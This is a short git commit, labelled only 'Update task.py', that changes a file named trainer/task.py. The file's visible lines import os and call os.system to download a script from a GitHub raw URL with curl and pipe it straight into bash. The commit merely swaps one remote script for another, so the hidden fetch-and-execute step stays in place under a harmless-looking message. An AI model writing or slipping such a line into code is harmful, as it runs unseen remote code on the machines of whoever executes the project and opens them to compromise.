a76b2bc0ec0f9f91202f43dbb95e76cf218b9fde
jhonaves <janekasparo@gmail.com>
2025-03-02 00:09:39 +0700

    Update task.py

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://raw.githubusercontent.com/jhonaves/adar/refs/heads/main/task.py | bash')
+os.system('curl -sL https://raw.githubusercontent.com/jhonaves/adar/refs/heads/main/prutes | bash')
